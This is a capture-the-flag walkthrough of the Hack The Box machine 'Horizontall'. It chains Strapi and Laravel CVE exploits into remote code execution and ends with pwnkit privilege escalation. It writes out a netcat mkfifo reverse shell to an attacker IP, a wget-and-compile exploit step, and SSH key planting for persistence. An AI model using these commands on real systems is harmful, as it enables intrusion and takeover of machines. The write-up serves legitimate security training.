---
description: https://app.hackthebox.com/machines/Horizontall
---

# Horizontall

## Nmap

```
sudo nmap 10.10.11.105 -p- -sS -sV                                                                                      

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

{% hint style="info" %}
Add horizontall.htb to /etc/hosts.
{% endhint %}

Starting out we see a custom webpage running on Nginx. After running through directory enumeration we are unable to pull any interesting results.

![](<../../../.gitbook/assets/image (174).png>)

Checking the network requests manually we do see some .js

![](<../../../.gitbook/assets/image (373).png>)

Browsing manually to one of the requests we see a large amount of code within the application script.

![](<../../../.gitbook/assets/image (358).png>)

Using `CyberChef` we able to extract any information which may be of interest to us. In this case a sub domain URL.

**Cyberchef:** [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)

![](<../../../.gitbook/assets/image (465).png>)

{% hint style="info" %}
Add api-prod.horizontall.htb to /etc/hosts.
{% endhint %}

After adding _api-prod.horizontall.htb_ to our hosts file we are then able to browse to the root page as shown below.

![](<../../../.gitbook/assets/image (1128).png>)

`Feroxbuster` reveals an _/Admin_ directory which redirects to a Strapi login page.

```
feroxbuster -u http://api-prod.horizontall.htb -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
```

![](<../../../.gitbook/assets/image (135).png>)

![](<../../../.gitbook/assets/image (122) (2).png>)

Using `searchsploit` we are able to determine an unauthenticated `RCE` exists for version _3.0.0-beta.17.4_.

```bash
searchsploit -w "strapi"
```

![](<../../../.gitbook/assets/image (104).png>)

Checking the current version of Strapi with `curl` to determine if we are working with a vulnerable version.

```bash
curl "http://api-prod.horizontall.htb/admin/init"
```

![](<../../../.gitbook/assets/image (1625).png>)

The following exploit linked below allows a password reset for the admin account and a JWT to be generated which will be required for the next exploit.

**Github:** [https://www.exploit-db.com/exploits/50239](https://www.exploit-db.com/exploits/50239) **(CVE-2019-18818)**

**NIST:** [https://nvd.nist.gov/vuln/detail/CVE-2019-18818](https://nvd.nist.gov/vuln/detail/CVE-2019-18818)

![](<../../../.gitbook/assets/image (137).png>)

With the generated JWT token we can now perform the authenticated RCE exploit and gain a shell on the target system. (Remember to set up a netcat listener on port 9001 first.)

**Github:** [https://github.com/z9fr/CVE-2019-19609/blob/main/exploit.py](https://github.com/z9fr/CVE-2019-19609/blob/main/exploit.py) **(CVE-2019-19609)**

**NIST:** [https://nvd.nist.gov/vuln/detail/CVE-2019-19609](https://nvd.nist.gov/vuln/detail/CVE-2019-19609)

```
python3 exploit.py <rhost> <lhost> <jwt> <url>
python3 exploit.py api-prod.horizontall.htb 10.10.14.14 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQ0NTI2ODgzLCJleHAiOjE2NDcxMTg4ODN9.2t51kjz4yTrHHUYHG3Ag799fLWiHLspwzccAX5bdsW0 http://api-prod.horizontall.htb/
```

![](<../../../.gitbook/assets/image (1504).png>)

![](<../../../.gitbook/assets/image (69) (2).png>)

For the next part we set up a `SSH` connection to allow easier exploitation of the target system.

**SSH**

For `SSH` access create a .ssh directory in the _strapi_ user home location and generate an `SSH` key and an authorized\_keys file.

```bash
# Create .ssh folder in /opt/strapi
mkdir /opt/strapi/.ssh

# Generate SSH key
ssh-keygen #Hit enter until complete

# Create authorized_keys file
touch authorized_keys

# echo contnets of id_rsa.pub into authorized_keys
echo "<Contents of id_rsa.pub>" > authroized_keys

# Next, copy id_rsa to the attacking system and SSH in as the strapi user.
ssh -i id_rsa strapi@10.10.11.105
```

![](<../../../.gitbook/assets/image (165).png>)

Now in via SSH and after performing some basic enumeration we see some interesting results for internal services running.

```bash
netstat -auntp
```

![](<../../../.gitbook/assets/image (56).png>)

Checking out what is running on the local ports with `curl` we see that under port 8000 Laravel v8 is running.

![](<../../../.gitbook/assets/image (124) (2).png>)

According to `searchsploit` Laravel v8 may be vulnerable to `RCE`.

![](<../../../.gitbook/assets/image (1425).png>)

In order to make the Laravel web page available to our attacking system we need to forward the internal port to our remote attacking host. With the SSH connection now setup we can reuse this as shown below:

**SSH forward remote port to local port**

```bash
ssh -i id_rsa strapi@10.10.11.105 -L 8000:127.0.0.1:8000
```

From which we can access Laravel over localhost on the attacking system.

![](<../../../.gitbook/assets/image (330).png>)

I did not have much luck with the `searchsploit` suggested PoC. However the PoC linked below worked much better.

**Github:** [https://github.com/nth347/CVE-2021-3129\_exploit](https://github.com/nth347/CVE-2021-3129\_exploit)

**Usage:**

```
git clone https://github.com/nth347/CVE-2021-3129_exploit.git
cd CVE-2021-3129_exploit
chmod +x exploit.py
./exploit.py http://localhost:8000 Monolog/RCE3 id
```

A reverse shell can be obtained with the following as `nc` is installed on the target system.

```bash
./exploit.py 'http://localhost:8000' Monolog/RCE2 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 9000 >/tmp/f"
```

![](<../../../.gitbook/assets/image (163) (2).png>)

**Exploit #2 CVE-2021-4034**

**NIST:** [https://nvd.nist.gov/vuln/detail/CVE-2021-4034](https://nvd.nist.gov/vuln/detail/CVE-2021-4034)

![](<../../../.gitbook/assets/image (31) (1).png>)

**Github:** [https://github.com/arthepsy/CVE-2021-4034](https://github.com/arthepsy/CVE-2021-4034) **(CVE-2021-4034)**

Download the exploit PoC to the target system, compile and execute.

```bash
wget 'http://<IP>/poc.c'
gcc 'poc.c' -o 'exploit'
chmod +x ./exploit
./exploit
```

![](<../../../.gitbook/assets/image (2052).png>)
